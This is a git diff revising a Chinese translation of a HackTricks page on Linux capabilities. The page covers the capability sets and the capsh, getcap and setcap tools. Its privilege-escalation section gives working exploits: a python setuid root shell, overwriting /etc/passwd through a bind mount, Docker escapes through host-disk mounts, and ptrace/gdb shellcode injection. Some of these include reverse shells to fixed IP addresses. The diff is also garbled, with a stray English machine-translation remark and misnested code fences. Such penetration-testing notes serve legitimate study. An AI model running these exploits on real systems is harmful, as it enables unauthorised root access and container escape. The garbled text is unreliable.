@@ -1,71 +1,75 @@
-# Linux 权限提升
+# Linux Capabilities
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+支持HackTricks的其他方式：
+
+* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**
 
 </details>
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点交流平台。
+​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。以**推广技术知识**为使命，这个大会是技术和网络安全专业人士的热点聚集地。\\
 
 {% embed url="https://www.rootedcon.com/" %}
 
-## 为什么使用权限提升？
+## 为什么需要capabilities？
 
-Linux 权限提升将一部分可用的 root 权限提供给进程。这有效地将 root 权限分解为更小且独立的单元。然后可以将这些单元独立地授予进程。这样，完整的权限集合就减少了，降低了利用风险。
+Linux capabilities **提供了root权限的一个子集**给进程。这有效地将root权限分解成更小、更独特的单元。然后，这些单元可以独立地授予给进程。这样，权限的完整集合被减少，降低了被利用的风险。
 
-为了更好地理解 Linux 权限提升的工作原理，让我们首先看一下它试图解决的问题。
+为了更好地理解Linux capabilities的工作原理，让我们先看看它试图解决的问题。
 
-假设我们正在以普通用户身份运行一个进程。这意味着我们没有特权。我们只能访问由我们拥有、我们所在组拥有或标记为所有用户可访问的数据。在某个时刻，我们的进程需要更多的权限来完成其任务，比如打开一个网络套接字。问题是普通用户无法打开套接字，因为这需要 root 权限。
+假设我们以普通用户身份运行一个进程。这意味着我们是非特权的。我们只能访问属于我们、我们组的数据，或者标记为所有用户都可以访问的数据。在某个时刻，我们的进程需要更多的权限来完成其职责，比如打开一个网络套接字。问题是普通用户不能打开套接字，因为这需要root权限。
 
-## 权限集合
+## Capabilities集合
 
-**继承的权限**
+**继承的capabilities**
 
-**CapEff**：_有效_权限集表示进程当前正在使用的所有权限（这是内核用于权限检查的实际权限集合）。对于文件权限，有效集合实际上是一个单个位，指示在运行二进制文件时是否将允许集合的权限移动到有效集合中。这使得不具备能力意识的二进制文件可以使用文件权限而不需要发出特殊的系统调用。
+**CapEff**：_有效_ capability集合代表了进程目前正在使用的所有capabilities（这是内核用于权限检查的实际capability集合）。对于文件capabilities，有效集合实际上是一个单一的位，指示在运行二进制文件时，允许集合中的capabilities是否会移动到有效集合中。这使得不具备capability意识的二进制文件能够在不发出特殊系统调用的情况下使用文件capabilities。
 
-**CapPrm**：(_允许的_) 这是线程可以添加到线程允许或线程可继承集合中的能力的超集。线程可以使用 capset() 系统调用来管理能力：它可以从任何集合中删除任何能力，但只能将其线程有效和继承集合中的能力添加到其线程允许集合中。因此，除非线程有效集合中具有 cap\_setpcap 能力，否则它无法将任何能力添加到其线程允许集合中。
+**CapPrm**：(_允许的_) 这是线程可能添加到线程允许或线程继承集合中的capabilities的超集。线程可以使用capset()系统调用来管理capabilities：它可以从任何集合中删除任何capability，但只能将其线程允许集合中的capabilities添加到其线程有效和继承集合中。因此，除非它在其线程有效集合中具有cap\_setpcap capability，否则它不能将任何capability添加到其线程允许集合中。
 
-**CapInh**：使用_继承_集合可以指定从父进程继承的所有能力。这样可以防止进程接收不需要的任何能力。此集合在 `execve` 之间保持不变，并且通常由接收能力的进程设置，而不是由分发能力给其子进程的进程设置。
+**CapInh**：使用_继承的_集合可以指定允许从父进程继承的所有capabilities。这防止了进程接收它不需要的任何capabilities。这个集合在`execve`中被保留，并且通常由一个_接收_ capabilities的进程设置，而不是由一个向其子进程分发capabilities的进程设置。
 
-**CapBnd**：使用_边界_集合，可以限制进程可能接收的能力。只有边界集合中存在的能力才允许在可继承和允许的集合中。
+**CapBnd**：通过_边界_集合，可以限制进程可能接收的capabilities。只有在边界集合中存在的capabilities才会被允许在继承和允许集合中。
 
-**CapAmb**：_环境_能力集适用于所有没有文件能力的非 SUID 二进制文件。它在调用 `execve` 时保留能力。然而，并非环境集合中的所有能力都可能被保留，因为如果它们在可继承或允许的能力集中不存在，则会被丢弃。此集合在 `execve` 调用之间保持不变。
+**CapAmb**：_环境_ capability集合适用于所有没有文件capabilities的非SUID二进制文件。它在调用`execve`时保留capabilities。然而，并非环境集合中的所有capabilities都可能被保留，因为如果它们不在继承或允许capability集合中，它们将被丢弃。这个集合在`execve`调用中被保留。
 
-有关线程和文件之间能力差异以及如何将能力传递给线程的详细解释，请阅读以下页面：
+有关线程和文件中capabilities的区别，以及capabilities如何传递给线程的详细解释，请阅读以下页面：
 
 * [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
 * [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
 
-## 进程和二进制文件的能力
+## 进程 & 二进制文件的Capabilities
 
-### 进程的能力
+### 进程Capabilities
 
-要查看特定进程的能力，请使用 /proc 目录中的 **status** 文件。由于它提供了更多详细信息，让我们仅限于与 Linux 权限提升相关的信息。\
-请注意，对于所有运行中的进程，能力信息是按线程维护的；对于文件系统中的二进制文件，它存储在扩展属性中。
+要查看特定进程的capabilities，请使用/proc目录中的**status**文件。因为它提供了更多细节，让我们仅限于与Linux capabilities相关的信息。\
+请注意，对于所有运行中的进程，capability信息是按线程维护的，对于文件系统中的二进制文件，则存储在扩展属性中。
 
-您可以在 /usr/include/linux/capability.h 中找到定义的能力。
+您可以在/usr/include/linux/capability.h中找到定义的capabilities
 
-您可以在 `cat /proc/self/status` 中找到当前进程的能力，或者在 `/proc/<pid>/status` 中找到其他用户的能力。
+您可以通过`cat /proc/self/status`或执行`capsh --print`找到当前进程的capabilities，以及在`/proc/<pid>/status`中找到其他用户的capabilities。
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
-这个命令在大多数系统上应该返回5行。
+```markdown
+此命令在大多数系统上应返回5行。
 
 * CapInh = 继承的能力
 * CapPrm = 允许的能力
 * CapEff = 有效的能力
 * CapBnd = 边界集
 * CapAmb = 环境能力集
+```
 ```bash
 #These are the typical capabilities of a root owned process (all)
 CapInh: 0000000000000000
@@ -74,12 +78,12 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-这些十六进制数字没有意义。使用capsh工具，我们可以将它们解码为能力名称。
+这些十六进制数字没有意义。使用 capsh 工具，我们可以将它们解码为 capabilities 名称。
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
 ```
-现在让我们来检查一下 `ping` 使用的**能力**：
+让我们现在检查 `ping` 使用的**capabilities**：
 ```bash
 cat /proc/9491/status | grep Cap
 CapInh:    0000000000000000
@@ -91,11 +95,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-虽然那样做也可以，但还有另一种更简单的方法。要查看运行中进程的能力，只需使用**getpcaps**工具，后跟其进程ID（PID）。您还可以提供进程ID的列表。
+尽管那样可行，但还有另一种更简单的方法。要查看正在运行的进程的capabilities，只需使用 **getpcaps** 工具，后跟其进程ID（PID）。您也可以提供一系列进程ID。
 ```bash
 getpcaps 1234
 ```
-让我们在为二进制文件提供足够的权限（`cap_net_admin`和`cap_net_raw`）以便嗅探网络后，检查`tcpdump`的能力（_tcpdump正在进程9562中运行_）：
+让我们检查在给予二进制文件足够的能力（`cap_net_admin` 和 `cap_net_raw`）来嗅探网络后的 `tcpdump` 的能力（_tcpdump 正在进程 9562 中运行_）：
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -113,42 +117,39 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-正如您所看到的，给定的能力与获取二进制文件能力的两种方式的结果相对应。\
-_getpcaps_工具使用**capget()**系统调用来查询特定线程的可用能力。此系统调用只需要提供PID即可获取更多信息。
-
 ### 二进制文件的能力
 
-二进制文件在执行时可以具有能力。例如，很常见的是找到具有`cap_net_raw`能力的`ping`二进制文件：
+二进制文件在执行时可以具有特定的能力。例如，常见的 `ping` 二进制文件具有 `cap_net_raw` 能力：
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-您可以使用以下命令**搜索具有特权的二进制文件**：
+你可以使用以下命令**搜索具有能力的二进制文件**：
 ```bash
 getcap -r / 2>/dev/null
 ```
-### 使用capsh降低特权
+### 使用 capsh 丢弃权限
 
-如果我们使用capsh降低_ping_的CAP\_NET\_RAW特权，那么_ping_实用程序将不再起作用。
+如果我们为 _ping_ 丢弃 CAP\_NET\_RAW 权限，那么 ping 工具应该就无法工作了。
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
-除了_capsh_本身的输出之外，_tcpdump_命令本身也应该引发错误。
+除了 _capsh_ 本身的输出外，_tcpdump_ 命令本身也应该引发错误。
 
 > /bin/bash: /usr/sbin/tcpdump: 操作不允许
 
-错误明确显示ping命令不允许打开ICMP套接字。现在我们可以确定这符合预期。
+错误清楚地表明 ping 命令不允许打开 ICMP 套接字。现在我们可以确定这是按预期工作的。
 
 ### 移除能力
 
-您可以使用以下命令移除二进制文件的能力：
+你可以移除二进制文件的能力，使用
 ```bash
 setcap -r </path/to/binary>
 ```
-## 用户权限
+## 用户能力
 
-显然，**也可以将权限分配给用户**。这可能意味着由用户执行的每个进程都可以使用用户的权限。\
-根据[这个](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[这个](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)和[这个](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)的信息，需要配置一些文件来为用户分配特定的权限，但是分配权限给每个用户的文件将是`/etc/security/capability.conf`。\
+显然，**也可以将能力分配给用户**。这可能意味着用户执行的每个进程都将能够使用用户的能力。\
+根据[这个](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[这个](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)和[这个](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)的信息，需要配置一些文件来给用户指定特定的能力，但分配给每个用户的能力将由`/etc/security/capability.conf`文件决定。\
 文件示例：
 ```bash
 # Simple
@@ -165,7 +166,7 @@ cap_sys_admin,22,25          jrsysadmin
 ```
 ## 环境能力
 
-编译以下程序，可以在提供能力的环境中**生成一个 bash shell**。
+编译以下程序可以**在提供能力的环境中生成一个bash shell**。
 
 {% code title="ambient.c" %}
 ```c
@@ -257,37 +258,37 @@ perror("Cannot exec");
 return 0;
 }
 ```
-{% endcode %}
+Since the provided text does not contain any English text that requires translation, there is no action needed. The markdown syntax provided is already complete and does not contain any translatable content. If you have any specific text that needs translation, please provide it, and I will assist you accordingly.
 ```bash
 gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-在由编译的环境二进制文件执行的bash中，可以观察到新的能力（普通用户在"current"部分没有任何能力）。
+在**编译后的环境二进制文件执行的bash**中，可以观察到**新的能力**（普通用户在"当前"部分不会有任何能力）。
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 {% hint style="danger" %}
-您只能添加在允许集和继承集中都存在的功能。
+您**只能添加**同时存在于允许集和可继承集中的**能力**。
 {% endhint %}
 
-### 有能力意识/无能力意识的二进制文件
+### 具备能力感知/无能力感知的二进制文件
 
-**有能力意识的二进制文件不会使用环境提供的新功能**，然而**无能力意识的二进制文件会使用**它们，因为它们不会拒绝它们。这使得无能力意识的二进制文件在授予二进制文件功能的特殊环境中容易受到攻击。
+**具备能力感知的二进制文件不会使用**环境赋予的新能力，然而**无能力感知的二进制文件会使用**它们，因为它们不会拒绝它们。这使得在特殊环境中，无能力感知的二进制文件变得容易受到攻击，因为该环境授予了二进制文件能力。
 
-## 服务功能
+## 服务的能力
 
-默认情况下，以root身份运行的服务将被分配所有功能，并且在某些情况下，这可能是危险的。\
-因此，**服务配置**文件允许**指定**您希望其具有的**功能**，以及应该执行服务的**用户**，以避免以不必要的特权运行服务：
+默认情况下，**以 root 身份运行的服务将被分配所有能力**，在某些情况下，这可能是危险的。\
+因此，**服务配置**文件允许**指定**您希望它具有的**能力**，**以及**应该执行服务的**用户**，以避免服务带有不必要的权限：
 ```bash
 [Service]
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Docker容器中的能力
+## Docker 容器中的能力
 
-默认情况下，Docker为容器分配了一些能力。通过运行以下命令，可以很容易地检查这些能力是哪些：
+默认情况下，Docker 会为容器分配一些能力。通过运行以下命令，可以非常容易地检查这些能力是什么：
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
 Capabilities:
@@ -304,15 +305,15 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士的热点聚会。
+[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。其使命是**推广技术知识**，这个大会是技术和网络安全专业人士在各个领域的交流热点。
 
 {% embed url="https://www.rootedcon.com/" %}
 
-## 提权/容器逃逸
+## Privesc/Container Escape
 
-在执行特权操作后（例如设置chroot和绑定到套接字后），当你想要限制自己的进程时，能力是非常有用的。然而，通过传递恶意命令或参数，它们可以被利用并以root权限运行。
+当你**想要在执行特权操作后限制自己的进程**（例如，设置chroot和绑定到一个套接字之后）时，Capabilities是有用的。然而，它们可以通过传递恶意命令或参数来利用，这些命令或参数随后以root身份运行。
 
-你可以使用`setcap`来强制程序使用能力，并使用`getcap`查询这些能力：
+你可以使用 `setcap` 强制对程序施加Capabilities，并使用 `getcap` 查询这些Capabilities：
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -321,15 +322,15 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` 表示你正在添加能力（“-”表示移除能力）作为有效和允许的。
+`+ep` 表示您正在添加能力（“-”将移除它）作为有效和允许的。
 
 要识别系统或文件夹中具有能力的程序：
 ```bash
 getcap -r / 2>/dev/null
 ```
-### 漏洞利用示例
+### 利用示例
 
-在下面的示例中，发现二进制文件 `/usr/bin/python2.6` 存在提权漏洞：
+在以下示例中，二进制文件 `/usr/bin/python2.6` 被发现存在提权漏洞：
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -337,54 +338,38 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-**`tcpdump`所需的权限**，以**允许任何用户嗅探数据包**：
-
-```bash
-# Set the necessary capabilities to tcpdump binary
-sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
-
-# Verify the capabilities
-getcap /usr/sbin/tcpdump
-```
-
-**为tcpdump二进制文件设置必要的权限**
-```bash
-sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
-
-# 验证权限
-getcap /usr/sbin/tcpdump
-```
+**Capabilities** 需要由 `tcpdump` 来**允许任何用户嗅探数据包**：
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
-### "空"能力的特殊情况
+### 特殊情况：“空”能力集
 
-请注意，可以将空的能力集分配给程序文件，因此可以创建一个设置用户ID为root的程序，将执行该程序的进程的有效和保存的用户ID更改为0，但不向该进程授予任何能力。换句话说，如果你有一个二进制文件：
+请注意，可以为程序文件分配空的能力集，因此可以创建一个设置用户 ID 为 root 的程序，该程序将执行该程序的进程的有效和保存的设置用户 ID 更改为 0，但不授予该进程任何能力。或者，简单地说，如果你有一个二进制文件：
 
-1. 不是由root拥有
-2. 没有设置`SUID`/`SGID`位
-3. 能力集为空（例如：`getcap myelf`返回`myelf =ep`）
+1. 不是由 root 拥有
+2. 没有设置 `SUID`/`SGID` 位
+3. 设置了空的能力集（例如：`getcap myelf` 返回 `myelf =ep`）
 
-那么**该二进制文件将以root身份运行**。
+那么**该二进制文件将以 root 身份运行**。
 
 ## CAP\_SYS\_ADMIN
 
-[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 是一个大部分功能的综合能力，它很容易导致额外的能力或完全的root权限（通常可以访问所有能力）。在容器中执行特权操作时，很难从容器中删除`CAP_SYS_ADMIN`。对于模拟整个系统的容器来说，保留这个能力通常是必要的，而对于更具限制性的单个应用程序容器来说，这是不必要的。除其他外，这允许**挂载设备**或滥用**release_agent**以逃离容器。
+[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 基本上是一个万能能力，它可以轻松导致获得额外的能力或完全的 root（通常是访问所有能力）。`CAP_SYS_ADMIN` 需要执行一系列**管理操作**，如果容器内执行特权操作，则难以从容器中删除此能力。对于模拟整个系统的容器来说，保留这个能力通常是必要的，与可以更加限制的单个应用程序容器相比。除其他事项外，这允许**挂载设备**或滥用 **release\_agent** 以从容器中逃逸。
 
-**使用二进制文件的示例**
+**带二进制文件的示例**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
-使用Python，您可以将修改后的_passwd_文件挂载到真实的_passwd_文件之上：
+使用python，您可以将修改过的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-最后，在`/etc/passwd`上**挂载**修改后的`passwd`文件：
+最后，将修改后的`passwd`文件**挂载**到`/etc/passwd`：
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -397,11 +382,11 @@ options = b"rw"
 mountflags = MS_BIND
 libc.mount(source, target, filesystemtype, mountflags, options)
 ```
-然后你将能够使用密码"password"以root身份执行**`su`**命令。
+你将能够使用密码 "password" 以 **`su` 作为 root**。
 
-**环境示例（Docker越狱）**
+**带环境的示例（Docker breakout）**
 
-你可以使用以下命令检查Docker容器中启用的能力：
+你可以使用以下命令检查 docker 容器内启用的 capabilities：
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
@@ -414,11 +399,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-在先前的输出中，您可以看到SYS_ADMIN功能已启用。
+在前面的输出中，您可以看到 SYS\_ADMIN 能力已启用。
 
 * **挂载**
 
-这允许Docker容器**挂载主机磁盘并自由访问**：
+这允许 docker 容器**挂载宿主磁盘并自由访问**：
 ```bash
 fdisk -l #Get disk name
 Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
@@ -430,10 +415,10 @@ mount /dev/sda /mnt/ #Mount it
 cd /mnt
 chroot ./ bash #You have a shell inside the docker hosts disk
 ```
-* **完全访问权限**
+* **完全访问**
 
-在之前的方法中，我们成功访问了Docker主机的磁盘。\
-如果你发现主机正在运行一个**ssh**服务器，你可以在Docker主机的磁盘上**创建一个用户**，然后通过SSH访问它：
+在前一种方法中，我们成功访问了docker宿主机的磁盘。\
+如果你发现宿主机正在运行一个**ssh**服务器，你可以**在docker宿主机磁盘内创建一个用户**，然后通过SSH访问它：
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -449,11 +434,11 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP\_SYS\_PTRACE
 
-**这意味着您可以通过在主机上运行的某个进程中注入shellcode来逃逸容器。**要访问在主机上运行的进程，容器至少需要以**`--pid=host`**运行。
+**这意味着您可以通过在宿主机中运行的某个进程内注入shellcode来逃离容器。** 要访问在宿主机内运行的进程，容器至少需要使用 **`--pid=host`** 运行。
 
-[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html)允许使用`ptrace(2)`和最近引入的跨内存附加系统调用，如`process_vm_readv(2)`和`process_vm_writev(2)`。如果授予了此权限并且`ptrace(2)`系统调用本身未被seccomp过滤器阻止，这将允许攻击者绕过其他seccomp限制，请参见[如果允许ptrace，则绕过seccomp的PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)或**以下PoC**：
+[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许使用 `ptrace(2)` 以及最近引入的跨内存附加系统调用，如 `process_vm_readv(2)` 和 `process_vm_writev(2)`。如果授予了这个能力，并且 `ptrace(2)` 系统调用本身没有被seccomp过滤器阻止，这将允许攻击者绕过其他seccomp限制，参见 [如果允许ptrace则绕过seccomp的PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) 或 **以下PoC**：
 
-**使用二进制文件的示例（python）**
+**使用二进制文件（python）的示例**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_ptrace+ep
@@ -545,63 +530,13 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 # Detach from the process.
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
-**使用二进制文件（gdb）的示例**
+**示例：使用二进制文件（gdb）**
 
-具有`ptrace`能力的`gdb`：
+具有 `ptrace` 能力的 `gdb`：
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-创建一个使用msfvenom生成的shellcode，通过gdb注入到内存中
-
-```bash
-# Generate the shellcode with msfvenom
-msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o shellcode.<extension>
-
-# Start gdb and attach it to the target process
-gdb -p <pid>
-
-# Set a breakpoint at a suitable location
-break <function>
-
-# Run the target process
-continue
-
-# Once the breakpoint is hit, inject the shellcode into memory
-call mmap(0, <shellcode_size>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
-call memcpy($rax, <shellcode_address>, <shellcode_size>)
-
-# Modify the program counter to jump to the injected shellcode
-set $rip = <shellcode_address>
-
-# Continue the execution
-continue
-```
-
-使用msfvenom生成shellcode，通过gdb注入到内存中的步骤如下：
-
-```bash
-# 使用msfvenom生成shellcode
-msfvenom -p <payload> LHOST=<attacker_ip> LPORT=<attacker_port> -f <format> -o shellcode.<extension>
-
-# 启动gdb并附加到目标进程
-gdb -p <pid>
-
-# 在适当的位置设置断点
-break <function>
-
-# 运行目标进程
-continue
-
-# 当断点触发时，将shellcode注入到内存中
-call mmap(0, <shellcode_size>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
-call memcpy($rax, <shellcode_address>, <shellcode_size>)
-
-# 修改程序计数器以跳转到注入的shellcode
-set $rip = <shellcode_address>
-
-# 继续执行
-continue
-```
+创建一个用 msfvenom 制作的 shellcode，通过 gdb 注入到内存中
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -625,7 +560,7 @@ chunks += f"{byte:02x}"
 
 print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
-调试一个使用gdb生成的root进程，并复制粘贴之前生成的gdb命令行：
+使用 gdb 调试一个 root 进程并复制粘贴之前生成的 gdb 代码行：
 ```bash
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
@@ -646,24 +581,26 @@ Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
-**使用环境示例（Docker越狱）- 另一种GDB滥用**
+**示例（Docker breakout）- 另一种 gdb 滥用**
 
-如果已安装**GDB**（或者可以使用`apk add gdb`或`apt install gdb`进行安装），您可以从主机上**调试一个进程**并使其调用`system`函数。（此技术还需要`SYS_ADMIN`能力）**。**
+如果 **GDB** 已安装（或者您可以使用 `apk add gdb` 或 `apt install gdb` 等命令安装），您可以**从宿主机调试进程**并使其调用 `system` 函数。（此技术还需要 `SYS_ADMIN` 权限）**。**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-您将无法看到执行的命令的输出，但它将由该进程执行（因此获取一个反向shell）。
+```markdown
+你将无法看到执行命令的输出，但该命令将由该进程执行（因此获取一个反向 shell）。
 
 {% hint style="warning" %}
-如果出现错误“当前上下文中没有符号“system””，请检查前面通过gdb将shellcode加载到程序中的示例。
+如果你收到错误 "No symbol "system" in current context."，请检查通过 gdb 在程序中加载 shellcode 的前一个示例。
 {% endhint %}
 
-**使用环境（Docker越狱）的示例 - Shellcode注入**
+**带环境的示例（Docker breakout）- Shellcode 注入**
 
-您可以使用以下命令检查Docker容器中启用的功能：
+你可以使用以下命令检查 Docker 容器内启用的 capabilities：
+```
 ```
 capsh --print
